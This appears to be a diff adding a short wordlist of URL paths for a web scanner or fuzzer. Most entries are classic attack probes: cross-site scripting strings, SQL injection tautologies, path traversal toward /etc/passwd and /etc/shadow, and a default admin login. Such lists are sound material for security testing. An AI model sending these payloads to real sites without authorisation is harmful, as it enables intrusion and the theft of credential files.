@@ -1,0 +1,12 @@
+/admin
+/robots.txt
+/<script>alert(1)</script>
+/?id=1' OR '1'='1
+/<img src=x onerror=alert(1)>
+/?id=1' OR 1=1--
+/../../../etc/passwd
+/../../../../../../etc/shadow
+/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/?q=<svg/onload=alert(1)>
+/login?user=admin&pass=admin
+/?search=<iframe src="javascript:alert(1)"></iframe>
